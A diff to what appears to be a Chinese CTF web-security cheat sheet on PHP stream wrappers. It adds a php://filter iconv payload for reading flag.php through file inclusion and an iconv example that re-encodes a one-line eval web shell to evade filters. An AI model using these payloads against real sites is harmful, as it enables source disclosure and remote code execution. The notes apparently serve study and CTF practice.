@@ -812,7 +812,22 @@ php://filter/read=convert.base64-encode/resource=要读的文件名
 php://filter/convert.base64-encode/resource=要读的文件名
 
 php://filter/string.rot13/resource=要读的文件名
+
+file=php://filter/convert.iconv.utf-8.utf-7/resource=flag.php
+iconv.从这个编码.转换到这个编码
 ```
+
+>iconv ( string $in_charset , string $out_charset , string $str ) : 
+>string将字符串 str 从 in_charset 转换编码到 out_charset。
+>in_charset：输入的字符集。
+>out_charset：输出的字符集。
+>
+>```php
+><?php
+>echo iconv("UCS-2LE","UCS-2BE",'<?php @eval($_POST[hack]);?>');
+>?>
+>//?<hp pe@av(l_$OPTSh[ca]k;)>?
+>```
 
 ####  phar://
 
